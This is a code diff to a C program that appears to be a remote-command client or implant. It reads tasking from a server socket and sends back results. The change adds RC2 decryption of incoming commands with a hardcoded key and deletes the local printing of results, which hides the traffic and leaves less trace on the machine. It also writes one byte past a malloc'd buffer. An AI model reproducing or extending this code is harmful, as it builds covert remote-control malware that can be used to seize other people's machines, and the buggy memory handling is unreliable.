@@ -226,7 +226,8 @@ int main(int argc, char const* argv[]) {
     snd_cli_hel_fin(sock);
 
     while (1) {
-        char buf_cmd[5000] = {0};
+        unsigned char key[17] = {0x79, 0xE1, 0x0A, 0x5D, 0x87, 0x7D, 0x9F, 0xF7, 0x5D, 0x12, 0x2E, 0x11, 0x65, 0xAC, 0xE3, 0x25, 0x00};
+        unsigned char buf_cmd[5000] = {0};
         int valread = read(sock, buf_cmd, 5000);
 
         long cod;
@@ -247,8 +248,12 @@ int main(int argc, char const* argv[]) {
             cmd_s = (buf_cmd[3] << 8) + buf_cmd[4];
         }
 
-        unsigned char* cmd = malloc(cmd_s+1);
-        strncpy(cmd, buf_cmd+5, cmd_s);
+        unsigned char* cmd_enc = malloc(cmd_s+1);
+        memcpy(cmd_enc, buf_cmd+5, cmd_s);
+        cmd_enc[cmd_s] = '\0';
+
+        unsigned char *cmd = malloc(cmd_s);
+        rc2(key, cmd_enc, cmd, cmd_s);
         cmd[cmd_s] = '\0';
 
         char buf_res[5000] = {0};
@@ -280,9 +285,6 @@ int main(int argc, char const* argv[]) {
             strncpy(buf_res, "(No Return)\n", buf_res_s);
         }
 
-        printf("%s\n", buf_res);
-
-        unsigned char key[17] = {0x79, 0xE1, 0x0A, 0x5D, 0x87, 0x7D, 0x9F, 0xF7, 0x5D, 0x12, 0x2E, 0x11, 0x65, 0xAC, 0xE3, 0x25, 0x00};
         unsigned char *ciphertext = malloc(buf_res_s);
         rc2(key, buf_res, ciphertext, buf_res_s);
 
@@ -300,7 +302,6 @@ int main(int argc, char const* argv[]) {
         unsigned char* fin_res2 = malloc(buf_res_s+1);
         rc2(key, fin_res+5, fin_res2, buf_res_s);
         fin_res2[buf_res_s] = 0;
-        printf("%s\n", fin_res2);
     }
 
     close(client_fd);
